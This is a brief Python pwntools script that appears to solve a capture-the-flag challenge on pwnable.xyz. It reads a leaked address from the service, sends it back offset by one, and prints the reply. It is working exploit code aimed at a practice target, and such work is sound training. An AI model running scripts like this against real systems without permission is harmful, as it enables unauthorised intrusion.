from pwn import *

elf = context.binary = ELF('./challenge')

p = remote('svc.pwnable.xyz', 30000)

p.recvuntil('Leak: ')
leak = p.recvline().strip(b'\n')
leak = int(leak, 16)

p.sendlineafter(': ', str(leak + 1))
p.sendlineafter(': ', 'test')

print(p.recvall().decode())
